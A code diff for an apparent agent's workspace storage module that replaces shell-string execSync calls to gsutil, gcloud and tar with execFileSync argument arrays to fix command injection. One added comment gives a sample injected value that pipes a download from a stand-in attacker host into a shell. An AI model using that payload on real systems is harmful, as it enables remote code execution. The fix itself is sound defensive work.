@@ -1,13 +1,19 @@
-import { execSync } from 'child_process';
+import { execFileSync } from 'child_process';
 import { existsSync, mkdirSync, unlinkSync, writeFileSync, mkdtempSync, rmSync } from 'fs';
 import { tmpdir } from 'os';
 import { join } from 'path';
 
 const ARCHIVE_NAME = 'workspace.tar.gz';
 
+// execFileSync, never execSync: `args` carry request-supplied values (the
+// bucket and path come straight off the /start payload), and joining them into
+// a shell string made `s3_bucket: "x; curl attacker|sh; #"` execute. Passing an
+// argv array bypasses the shell entirely, so metacharacters stay data.
+// Flag injection is not reachable either — every value is interpolated into a
+// `gs://…` URI or is an internal constant, so no argument can start with `-`.
 function gsutil(...args) {
   try {
-    execSync(['gsutil', ...args].join(' '), { stdio: 'pipe' });
+    execFileSync('gsutil', args, { stdio: 'pipe' });
     console.log('[pi-agent] gsutil', args.join(' '), 'ok');
     return true;
   } catch (e) {
@@ -35,7 +41,7 @@ export function activateGcloudServiceAccount() {
     return
   }
   try {
-    execSync(`gcloud auth activate-service-account --key-file=${keyFile}`, { stdio: 'pipe', timeout: 30000 })
+    execFileSync('gcloud', ['auth', 'activate-service-account', `--key-file=${keyFile}`], { stdio: 'pipe', timeout: 30000 })
     console.log('[pi-agent] gcloud service account activated')
   } catch (e) {
     console.warn('[pi-agent] gcloud activate-service-account failed:', e.stderr?.toString() || e.message)
@@ -63,7 +69,7 @@ export function downloadWorkspace(extra, workspaceDir) {
   rmSync(workspaceDir, { recursive: true, force: true });
   mkdirSync(workspaceDir, { recursive: true });
   try {
-    execSync(`tar xzf ${localArchive} -C ${workspaceDir}`, { stdio: 'pipe' });
+    execFileSync('tar', ['xzf', localArchive, '-C', workspaceDir], { stdio: 'pipe' });
     unlinkSync(localArchive);
     console.log('[pi-agent] downloadWorkspace: restored workspace from', gcsUri);
     return true;
@@ -87,7 +93,7 @@ export function uploadWorkspace(extra, workspaceDir) {
   console.log('[pi-agent] uploadWorkspace: attempting to archive and upload', workspaceDir);
   const localArchive = `/tmp/${ARCHIVE_NAME}`;
   try {
-    execSync(`tar czf ${localArchive} -C ${workspaceDir} .`, { stdio: 'pipe' });
+    execFileSync('tar', ['czf', localArchive, '-C', workspaceDir, '.'], { stdio: 'pipe' });
   } catch (e) {
     console.warn('[pi-agent] uploadWorkspace: tar create failed:', e.stderr?.toString() || e.message);
     return null;
